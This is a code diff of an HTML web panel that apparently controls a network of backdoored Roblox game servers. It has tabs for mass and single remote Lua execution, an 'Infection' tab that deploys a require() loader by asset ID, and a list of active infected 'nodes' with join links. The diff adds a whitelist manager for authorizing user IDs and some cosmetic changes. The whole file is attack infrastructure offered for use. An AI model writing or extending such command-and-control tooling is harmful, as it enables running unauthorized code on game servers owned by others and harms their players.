@@ -8,7 +8,7 @@
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
         .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
         .nav { display: flex; gap: 12px; }
-        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 10px; border-radius: 5px; }
+        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 10px; border-radius: 5px; transition: 0.2s; }
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: #1c1c1e; border-radius: 18px; width: 520px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
@@ -30,6 +30,7 @@
             <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
             <button class="nav-btn" onclick="showTab('single', this)">Single</button>
             <button class="nav-btn" onclick="showTab('inf', this)">Infection</button>
+            <button class="nav-btn" onclick="showTab('wl', this)">Whitelist</button>
             <button class="nav-btn" onclick="showTab('nodes', this)">Nodes</button>
         </div>
         <div id="clock" style="font-size:10px; color:#86868b;"></div>
@@ -37,7 +38,7 @@
 
     <div class="container">
         <div class="card">
-            <div id="mass" class="tab-content active">
+            <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
                 <input type="password" id="m_pw" placeholder="Admin Password">
                 <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
@@ -45,7 +46,7 @@
             </div>
             <div id="single" class="tab-content" style="display:none;">
                 <h2>Single Execution</h2>
-                <select id="target_id"><option value="">No Servers Online</option></select>
+                <select id="target_id"><option value="">Scanning...</option></select>
                 <input type="password" id="s_pw" placeholder="Admin Password">
                 <textarea id="s_lua" rows="6" placeholder="-- Target Lua"></textarea>
                 <button class="btn-main" onclick="send('single')">Execute Target</button>
@@ -55,6 +56,12 @@
                 <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                 <button class="btn-main" onclick="send('inf')">Deploy</button>
             </div>
+            <div id="wl" class="tab-content" style="display:none;">
+                <h2>Whitelist Manager</h2>
+                <input type="text" id="wid" placeholder="Roblox UserID">
+                <button class="btn-main" onclick="wlu('add')">Authorize ID</button>
+                <button class="btn-main" style="background:#222; margin-top:8px;" onclick="wlu('remove')">Revoke ID</button>
+            </div>
             <div id="nodes" class="tab-content" style="display:none;">
                 <h2>Active Nodes</h2>
                 <div id="node_list" class="node-box"></div>
@@ -63,7 +70,8 @@
     </div>
 
     <div class="music-ctrl">
-        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer;" onclick="toggle()">PAUSE</button>
+        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer; padding:5px 10px;" onclick="toggle()">PAUSE</button>
+        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer; padding:5px 10px;" onclick="kill()">STOP</button>
     </div>
 
     <script>
@@ -81,6 +89,8 @@
             else { audio.pause(); document.getElementById('pBtn').innerText="PLAY"; }
         }
 
+        function kill() { audio.pause(); audio.src=""; document.querySelector('.music-ctrl').style.display='none'; }
+
         function showTab(id, btn) {
             document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
@@ -96,6 +106,12 @@
             alert("Sent");
         }
 
+        async function wlu(a){
+            const i=document.getElementById('wid').value;
+            await fetch('/update-whitelist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:i,action:a})});
+            alert("Whitelist Updated");
+        }
+
         async function update() {
             try {
                 const res = await fetch('/get-games');
@@ -103,9 +119,9 @@
                 const keys = Object.keys(data);
                 document.getElementById('node_list').innerHTML = keys.map(k => `
                     <div class="node-item">
-                        <div><b>${data[k].name}</b><br><small>${k}</small></div>
-                        <a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" style="color:white; font-size:10px;">JOIN</a>
-                    </div>`).join('');
+                        <div><b>${data[k].name}</b><br><small style="font-family:monospace; color:#666;">JOBID: ${k}</small></div>
+                        <a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" style="background:#fff; color:#000; text-decoration:none; font-size:10px; font-weight:bold; padding:4px 8px; border-radius:10px;">JOIN</a>
+                    </div>`).join('') || '<div style="padding:20px; text-align:center; color:#444;">No Servers Found</div>';
                 document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('');
             } catch(e) {}
         }
